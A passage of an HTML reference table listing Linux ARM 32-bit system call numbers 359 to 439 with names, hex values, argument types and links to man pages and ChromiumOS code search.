<td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td>
<td align="center">0x167</td>
<td>int *fildes</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">360</td>
<td>inotify_init1</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td>
<td align="center">0x168</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">361</td>
<td>preadv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td>
<td align="center">0x169</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>-</td>
</tr>
<tr>
<td align="center">362</td>
<td>pwritev</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td>
<td align="center">0x16a</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>-</td>
</tr>
<tr>
<td align="center">363</td>
<td>rt_tgsigqueueinfo</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td>
<td align="center">0x16b</td>
<td>pid_t tgid</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>siginfo_t *uinfo</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">364</td>
<td>perf_event_open</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td>
<td align="center">0x16c</td>
<td>struct perf_event_attr *attr_uptr</td>
<td>pid_t pid</td>
<td>int cpu</td>
<td>int group_fd</td>
<td>unsigned long flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">365</td>
<td>recvmmsg</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td>
<td align="center">0x16d</td>
<td>int fd</td>
<td>struct mmsghdr *msg</td>
<td>unsigned int vlen</td>
<td>unsigned flags</td>
<td>struct __kernel_timespec *timeout</td>
<td>-</td>
</tr>
<tr>
<td align="center">366</td>
<td>accept4</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td>
<td align="center">0x16e</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int *</td>
<td>int</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">367</td>
<td>fanotify_init</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td>
<td align="center">0x16f</td>
<td>unsigned int flags</td>
<td>unsigned int event_f_flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">368</td>
<td>fanotify_mark</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td>
<td align="center">0x170</td>
<td>int fanotify_fd</td>
<td>unsigned int flags</td>
<td>u64 mask</td>
<td>int fd</td>
<td>const char *pathname</td>
<td>-</td>
</tr>
<tr>
<td align="center">369</td>
<td>prlimit64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td>
<td align="center">0x171</td>
<td>pid_t pid</td>
<td>unsigned int resource</td>
<td>const struct rlimit64 *new_rlim</td>
<td>struct rlimit64 *old_rlim</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">370</td>
<td>name_to_handle_at</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td>
<td align="center">0x172</td>
<td>int dfd</td>
<td>const char *name</td>
<td>struct file_handle *handle</td>
<td>int *mnt_id</td>
<td>int flag</td>
<td>-</td>
</tr>
<tr>
<td align="center">371</td>
<td>open_by_handle_at</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td>
<td align="center">0x173</td>
<td>int mountdirfd</td>
<td>struct file_handle *handle</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">372</td>
<td>clock_adjtime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td>
<td align="center">0x174</td>
<td>clockid_t which_clock</td>
<td>struct __kernel_timex *tx</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">373</td>
<td>syncfs</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td>
<td align="center">0x175</td>
<td>int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">374</td>
<td>sendmmsg</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td>
<td align="center">0x176</td>
<td>int fd</td>
<td>struct mmsghdr *msg</td>
<td>unsigned int vlen</td>
<td>unsigned flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">375</td>
<td>setns</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td>
<td align="center">0x177</td>
<td>int fd</td>
<td>int nstype</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">376</td>
<td>process_vm_readv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td>
<td align="center">0x178</td>
<td>pid_t pid</td>
<td>const struct iovec *lvec</td>
<td>unsigned long liovcnt</td>
<td>const struct iovec *rvec</td>
<td>unsigned long riovcnt</td>
<td>unsigned long flags</td>
</tr>
<tr>
<td align="center">377</td>
<td>process_vm_writev</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td>
<td align="center">0x179</td>
<td>pid_t pid</td>
<td>const struct iovec *lvec</td>
<td>unsigned long liovcnt</td>
<td>const struct iovec *rvec</td>
<td>unsigned long riovcnt</td>
<td>unsigned long flags</td>
</tr>
<tr>
<td align="center">378</td>
<td>kcmp</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td>
<td align="center">0x17a</td>
<td>pid_t pid1</td>
<td>pid_t pid2</td>
<td>int type</td>
<td>unsigned long idx1</td>
<td>unsigned long idx2</td>
<td>-</td>
</tr>
<tr>
<td align="center">379</td>
<td>finit_module</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td>
<td align="center">0x17b</td>
<td>int fd</td>
<td>const char *uargs</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">380</td>
<td>sched_setattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td>
<td align="center">0x17c</td>
<td>pid_t pid</td>
<td>struct sched_attr *attr</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">381</td>
<td>sched_getattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td>
<td align="center">0x17d</td>
<td>pid_t pid</td>
<td>struct sched_attr *attr</td>
<td>unsigned int size</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">382</td>
<td>renameat2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td>
<td align="center">0x17e</td>
<td>int olddfd</td>
<td>const char *oldname</td>
<td>int newdfd</td>
<td>const char *newname</td>
<td>unsigned int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">383</td>
<td>seccomp</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td>
<td align="center">0x17f</td>
<td>unsigned int op</td>
<td>unsigned int flags</td>
<td>void *uargs</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">384</td>
<td>getrandom</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td>
<td align="center">0x180</td>
<td>char *buf</td>
<td>size_t count</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">385</td>
<td>memfd_create</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td>
<td align="center">0x181</td>
<td>const char *uname_ptr</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">386</td>
<td>bpf</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td>
<td align="center">0x182</td>
<td>int cmd</td>
<td>union bpf_attr *attr</td>
<td>unsigned int size</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">387</td>
<td>execveat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td>
<td align="center">0x183</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>const char *const *argv</td>
<td>const char *const *envp</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">388</td>
<td>userfaultfd</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td>
<td align="center">0x184</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">389</td>
<td>membarrier</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td>
<td align="center">0x185</td>
<td>int cmd</td>
<td>unsigned int flags</td>
<td>int cpu_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">390</td>
<td>mlock2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td>
<td align="center">0x186</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">391</td>
<td>copy_file_range</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td>
<td align="center">0x187</td>
<td>int fd_in</td>
<td>loff_t *off_in</td>
<td>int fd_out</td>
<td>loff_t *off_out</td>
<td>size_t len</td>
<td>unsigned int flags</td>
</tr>
<tr>
<td align="center">392</td>
<td>preadv2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td>
<td align="center">0x188</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>rwf_t flags</td>
</tr>
<tr>
<td align="center">393</td>
<td>pwritev2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td>
<td align="center">0x189</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>rwf_t flags</td>
</tr>
<tr>
<td align="center">394</td>
<td>pkey_mprotect</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td>
<td align="center">0x18a</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned long prot</td>
<td>int pkey</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">395</td>
<td>pkey_alloc</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td>
<td align="center">0x18b</td>
<td>unsigned long flags</td>
<td>unsigned long init_val</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">396</td>
<td>pkey_free</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td>
<td align="center">0x18c</td>
<td>int pkey</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">397</td>
<td>statx</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td>
<td align="center">0x18d</td>
<td>int dfd</td>
<td>const char *path</td>
<td>unsigned flags</td>
<td>unsigned mask</td>
<td>struct statx *buffer</td>
<td>-</td>
</tr>
<tr>
<td align="center">398</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x18e</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">399</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x18f</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">400</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x190</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">401</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x191</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">402</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x192</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">403</td>
<td>clock_gettime64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime64">cs/</a></td>
<td align="center">0x193</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">404</td>
<td>clock_settime64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime64">cs/</a></td>
<td align="center">0x194</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">405</td>
<td>clock_adjtime64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime64">cs/</a></td>
<td align="center">0x195</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">406</td>
<td>clock_getres_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres_time64">cs/</a></td>
<td align="center">0x196</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">407</td>
<td>clock_nanosleep_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep_time64">cs/</a></td>
<td align="center">0x197</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">408</td>
<td>timer_gettime64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime64">cs/</a></td>
<td align="center">0x198</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">409</td>
<td>timer_settime64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime64">cs/</a></td>
<td align="center">0x199</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">410</td>
<td>timerfd_gettime64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime64">cs/</a></td>
<td align="center">0x19a</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">411</td>
<td>timerfd_settime64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime64">cs/</a></td>
<td align="center">0x19b</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">412</td>
<td>utimensat_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat_time64">cs/</a></td>
<td align="center">0x19c</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">413</td>
<td>pselect6_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6_time64">cs/</a></td>
<td align="center">0x19d</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">414</td>
<td>ppoll_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll_time64">cs/</a></td>
<td align="center">0x19e</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">415</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x19f</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">416</td>
<td>io_pgetevents_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_pgetevents_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_pgetevents_time64">cs/</a></td>
<td align="center">0x1a0</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">417</td>
<td>recvmmsg_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg_time64">cs/</a></td>
<td align="center">0x1a1</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">418</td>
<td>mq_timedsend_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend_time64">cs/</a></td>
<td align="center">0x1a2</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">419</td>
<td>mq_timedreceive_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive_time64">cs/</a></td>
<td align="center">0x1a3</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">420</td>
<td>semtimedop_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop_time64">cs/</a></td>
<td align="center">0x1a4</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">421</td>
<td>rt_sigtimedwait_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait_time64">cs/</a></td>
<td align="center">0x1a5</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">422</td>
<td>futex_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/futex_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex_time64">cs/</a></td>
<td align="center">0x1a6</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">423</td>
<td>sched_rr_get_interval_time64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval_time64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval_time64">cs/</a></td>
<td align="center">0x1a7</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">424</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1a8</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">425</td>
<td>io_uring_setup</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_uring_setup">cs/</a></td>
<td align="center">0x1a9</td>
<td>u32 entries</td>
<td>struct io_uring_params *p</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">426</td>
<td>io_uring_enter</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_uring_enter.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_uring_enter">cs/</a></td>
<td align="center">0x1aa</td>
<td>unsigned int fd</td>
<td>u32 to_submit</td>
<td>u32 min_complete</td>
<td>u32 flags</td>
<td>const void *argp</td>
<td>size_t argsz</td>
</tr>
<tr>
<td align="center">427</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1ab</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">428</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1ac</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">429</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1ad</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">430</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1ae</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">431</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1af</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">432</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b0</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">433</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">434</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b2</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">435</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b3</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">436</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b4</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">437</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">438</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x1b6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">439</td>
<td>faccessat2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat2">cs/</a></td>
<td align="center">0x1b7</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int mode</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">983041</td>
<td>ARM_breakpoint</td>
